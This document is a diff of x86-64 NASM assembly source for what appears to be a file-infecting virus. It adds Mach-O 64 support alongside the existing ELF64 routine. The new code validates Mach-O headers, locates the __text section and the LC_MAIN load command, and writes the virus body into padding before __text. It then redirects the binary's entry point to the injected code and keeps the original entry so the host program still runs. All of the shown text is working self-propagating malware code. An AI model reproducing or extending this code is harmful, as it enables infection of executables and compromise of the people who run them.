@@ -202,12 +202,19 @@ process:                                                         ; expecting fil
 
                 mov         [rsp-0x58], rax                     ;rsp-0x58 = infect_mem
                 mov         rdi, rax
+
                 call        is_valid_elf64
-                cmp         rax, 1
-                jnz         .unmap
+                test        al, al
+                jnz         .insert_elf64
 
-                call        insert
+                call        is_valid_macho64
+                test        al, al
+                jz          .unmap
 
+                call        insert_macho64
+                jmp         .unmap
+
+.insert_elf64:  call        insert_elf64
 
 .unmap:         mov         rsi, [rsp-0x50]                     ; infect_fsize
                 mov         rdi, [rsp-0x58]                     ; infect_mem
@@ -238,7 +245,22 @@ is_valid_elf64:                                                 ; expecing data 
 .ok:            inc         rax
 .return:        ret
 
-insert:                                                         ; expecting data in rdi
+
+is_valid_macho64:
+                push        rdi
+                call        .mach_header_64
+                db 0xcf, 0xfa, 0xed, 0xfe, 7, 0, 0, 1, 3, 0, 0, 0x80, 2, 0, 0, 0
+.mach_header_64:pop         rsi
+                xor         ecx, ecx
+                mul         rcx
+                mov         cl, 4
+                repe        cmpsd
+                jnz         .return
+                inc         al
+.return:        pop         rdi
+                ret
+
+insert_elf64:                                                   ; expecting data in rdi
                 push        r13
                 push        r14
                 push        r15
@@ -305,6 +327,70 @@ insert:                                                         ; expecting data
                 pop         r14
                 pop         r13
                 ret
+
+%define         LC_SEGMENT_64       0x19
+%define         LC_MAIN             0x80000028
+
+insert_macho64:                                                 ; expecting data in rdi
+                mov         rsi, rdi
+                mov         ecx, dword [rdi + 0x10]             ; mach_header_64.ncmds
+                add         rdi, 0x20
+                xor         r12, r12
+                xor         r13, r13
+.lc_segment_64: cmp         dword [rdi], LC_SEGMENT_64
+                jnz         .lc_main
+                mov         rax, 0x0000545845545F5F             ; "__TEXT",0,0
+                cmp         rax, qword [rdi + 8]                ;
+                jnz         .next_lcmd
+                                                                ; XXX note: expecting first section of __TEXT segment
+                                                                ; to be the __text section
+                cmp         rax, qword [rdi + 0x48 + 0x10]      ; this should work for most but not all binaries
+                jnz         .return                
+                mov         rdx, 0x0000747865745F5F             ; "__text",0,0
+                cmp         rdx, qword [rdi + 0x48]             ; section_64.sectname
+                jnz         .return
+                mov         r12, rdi                            ; at this point r12 points to segment_command_64
+                                                                ; sizeof segment_command_64 = 0x48
+                                                                ; sizeof section_64 = 0x50
+                                                                ; dword at [r12 + 0x48 + 0x30] is section_64.offset
+.lc_main:       cmp         dword [rdi], LC_MAIN
+                jnz         .next_lcmd
+                test        r12, r12
+                jz          .return
+                mov         r13, rdi                            ; r13 points to entry_point_command
+                                                                ; qword at [r13 + 8] is entryoff
+                mov         rdi, rsi
+                mov         eax, dword [r12 + 0x48 + 0x30]      ; file offset of __text section
+                add         rdi, rax
+                mov         ecx, (_finish - _start) + 0x50      ; extra padding
+                sub         rdi, rcx
+
+                xor         al, al
+                repz        scasb
+                test        ecx, ecx
+                ja          .return                             ; not enough room
+
+                dec         rdi
+                mov         ecx, (_finish - _start)
+                sub         rdi, rcx
+                mov         rax, rdi
+                sub         rax, rsi                            ; rax == new entry point
+                lea         rsi, [rel _start]
+                rep         movsb
+
+                mov         rdx, qword [r13 + 8]
+                mov         qword [r13 + 8], rax
+                dec         rdi
+                mov         qword [rdi - 8], rdx                ; store entry
+                mov         qword [rdi - 16], rax               ; store pos
+                jmp         .return
+
+.next_lcmd:     mov         eax, dword [rdi + 4]                ; cmdsize
+                add         rdi, rax
+                dec         ecx
+                jnz        .lc_segment_64
+.return         ret
+
 
 _platform:
 %ifidn __OUTPUT_FORMAT__, elf64
